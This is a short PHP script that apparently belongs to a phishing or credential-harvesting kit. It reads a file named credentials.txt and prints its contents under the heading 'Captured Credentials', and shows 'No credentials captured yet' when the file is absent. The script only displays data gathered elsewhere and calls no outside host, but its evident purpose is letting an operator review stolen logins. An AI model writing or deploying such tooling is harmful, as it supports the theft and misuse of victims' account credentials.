<?php
if (file_exists("credentials.txt")) {
    echo "<h2>Captured Credentials</h2>";
    echo "<pre>";
    echo htmlspecialchars(file_get_contents("credentials.txt"));
    echo "</pre>";
} else {
    echo "No credentials captured yet.";
}
?>
